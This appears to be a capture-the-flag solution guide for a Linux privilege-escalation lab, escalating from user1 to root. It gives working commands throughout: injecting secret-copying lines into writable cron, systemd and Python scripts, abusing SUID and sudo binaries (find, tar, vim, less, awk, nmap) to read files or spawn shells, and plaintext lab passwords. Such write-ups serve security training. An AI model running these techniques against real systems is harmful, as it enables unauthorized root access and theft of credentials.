# CTF Challenge Solutions

## user1 → user2
1. Log in as `user1`.
2. Search for files owned by group `user2` and world-readable:
   ```bash
   find / -group user2 -perm -004 -type f 2>/dev/null
   ```
   This reveals `/var/tmp/secret.txt`.
3. Read its content: `Nlk1RWoxTWE4RGszQ3g3Tg==`.
4. Decode following the hints: reverse → ROT13 → Base64.
   ```bash
   echo Nlk1RWoxTWE4RGszQ3g3Tg== | base64 -d | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m'
   ```
   Result: `A7kP3xQ8nZ1wR5L6`.
5. Log in as `user2` with that password.

## user2 → user3
1. Read `/home/user2/user3.txt`: it explains cron runs `/opt/backup_user3.sh` and that both the script and `/opt/backup/include.list` are writable by group `backupops`.
2. Confirm with `ls -l /opt/backup_user3.sh` (user3:backupops 0770) and `ls -l /opt/backup/include.list` (user3:backupops 0664). user2 already belongs to `backupops`.
3. Edit `/opt/backup_user3.sh` (append a `cat /home/user3/secret.txt > /tmp/user3_sync/secret.txt` line) or modify the include list to point at a path under `/tmp` you control.
4. Wait for cron (every 5 minutes) or run `sudo -u user3 /opt/backup_user3.sh` if you gain execution another way; the injected command runs as user3.
5. Read `/tmp/user3_sync/secret.txt`; it contains `C9mN4tV2pH7sJ5dE`, the password for `user3`.

## user3 → user4
1. Read `/home/user3/user4.txt`; it hints at a custom binary (`/usr/local/bin/u4view`).
2. Check permissions: `ls -l /usr/local/bin/u4view` (user4:user3, mode 4770).
3. `/home/user4` is `0700`, so use `u4view -d /home/user4` to list it.
4. Run `u4view -f /home/user4/secret.txt` to print `Q1w2E3r4T5y6U7i8`.
5. Log in as user4.

## user4 → user5
1. Read `/home/user4/user5.txt`: it describes the `systemd --user` service.
2. Confirm directory access: `ls -ld /home/user5` shows `user5:syncshare 0750`.
3. The script is writable by group: `ls -l /opt/user5/bin/note_sync.sh`.
4. Edit it to leak the password (e.g. append `cat /home/user5/secret.txt > /tmp/user5_secret`). Wait for the timer (runs every ~2 minutes) or, if you later control user5, restart the service manually. Each execution refreshes `/tmp/user5_service_ok` (0600), so you can watch that file’s timestamp to spot when your payload triggers.
5. Once the script runs, read `/tmp/user5_secret` for `R8nT2pL6sV4yQ1wZ` and log in as user5.

## user5 → user6
1. Read `/home/user5/user6.txt`: it mentions `/usr/local/bin/u6awk`.
2. Check permissions: `ls -l /usr/local/bin/u6awk` (user6:user5, 4750).
3. Use the GTFOBins read primitive instead of trying to spawn a shell:
   ```bash
   LFILE=/home/user6/secret.txt
   /usr/local/bin/u6awk '//' "$LFILE"
   ```
4. The command prints `S3u7Yp9Lw2Hq4V8X`; use it to log in as user6.

## user6 → user7
1. Read `/home/user6/user7.txt`: it explains he can run `sudo /usr/local/bin/u7-find` as user7.
2. Confirm the sudo rule: `sudo -l` should show `/usr/local/bin/u7-find *` allowed for user7.
3. Use the GTFOBins pattern:
   ```bash
   sudo -u user7 /usr/local/bin/u7-find . -exec /bin/sh \; -quit
   ```
4. This spawns a shell as user7; read `/home/user7/secret.txt` (`T8r5Qw1La3Ns7V9K`).

## user7 → user8
1. Read `/home/user7/user8.txt`: it points to `/usr/local/bin/u8-view`.
2. Run `/usr/local/bin/u8-view` to open `less`. (Even though the binary is SUID, `!sh` drops to your real UID, so don’t expect a shell as user8.)
3. Use `less` to read `/home/user8/secret.txt` directly (`:e /home/user8/secret.txt`) or run `:r !cat /home/user8/secret.txt`.
4. With the password (`U2y6Pf4Ka8Md1S3Z`), log in as user8/`su - user8`.

## user8 → user9
1. Read `/home/user8/user9.txt`: use `sudo -u user9 /usr/bin/python3 /opt/user9/maintenance.py`.
2. `sudo -l` confirms the NOPASSWD entry.
3. Edit `/opt/user9/maintenance.py` (group `maintops`) to dump the secret:
   ```bash
   echo 'print(open("/home/user9/secret.txt").read())' >> /opt/user9/maintenance.py
   ```
4. Run the sudo command to execute the script as user9:
   ```bash
   sudo -u user9 /usr/bin/python3 /opt/user9/maintenance.py
   ```
5. The output includes `V5t1Hg7Lc2Nb4Q8X`.

## user9 → user10
1. Read `/home/user9/user10.txt`: `sudo -u user10 /usr/bin/tar -cf /tmp/backup.tar *`.
2. Abuse tar with `--checkpoint-action`:
   ```bash
   cd /tmp
   sudo -u user10 /usr/bin/tar -cf /tmp/backup.tar * --checkpoint=1 --checkpoint-action=exec=/bin/bash
   ```
3. Read `/home/user10/secret.txt`.

## user10 → user11
1. Read `/home/user10/user11.txt`: references `/usr/local/bin/u11-cat`.
2. Run:
   ```bash
   /usr/local/bin/u11-cat /home/user11/secret.txt
   ```
3. Log in as user11.

## user11 → user12
1. Read `/home/user11/user12.txt`: `sudo /usr/bin/vim /var/log/app/user12.log`.
2. Escape from vim (`:!bash` or `:e /home/user12/secret.txt`) to obtain user12.
3. Read `/home/user12/secret.txt`.

## user12 → root
1. Read `/home/user12/root.txt`: it mentions `nmap520` (SUID root).
2. Run:
   ```bash
   /usr/local/bin/nmap520 --interactive
   nmap> !sh
   ```
3. `!sh` drops you to a root shell thanks to the legacy interactive mode.
